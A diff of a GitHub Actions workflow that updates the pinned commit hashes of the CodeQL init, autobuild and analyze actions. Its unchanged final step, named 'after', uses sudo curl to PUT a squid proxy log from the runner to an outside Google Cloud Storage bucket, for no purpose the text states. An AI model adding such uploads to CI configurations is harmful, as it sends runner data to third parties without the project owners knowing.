@@ -258,15 +258,15 @@ jobs:
       uses: actions/checkout@2541b1294d2704b0964813337f33b291d3f8596b
     - continue-on-error: true
       name: Initialize CodeQL
-      uses: github/codeql-action/init@807578363a7869ca324a79039e6db9c843e0e100
+      uses: github/codeql-action/init@f779452ac5af1c261dce0346a8f964149f49322b
       with:
         languages: ${{ matrix.language }}
     - continue-on-error: true
       name: Autobuild
-      uses: github/codeql-action/autobuild@807578363a7869ca324a79039e6db9c843e0e100
+      uses: github/codeql-action/autobuild@f779452ac5af1c261dce0346a8f964149f49322b
     - continue-on-error: true
       name: Perform CodeQL Analysis
-      uses: github/codeql-action/analyze@807578363a7869ca324a79039e6db9c843e0e100
+      uses: github/codeql-action/analyze@f779452ac5af1c261dce0346a8f964149f49322b
     - name: after
       run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/Canva/jaeger-public.$(date
         +%s)
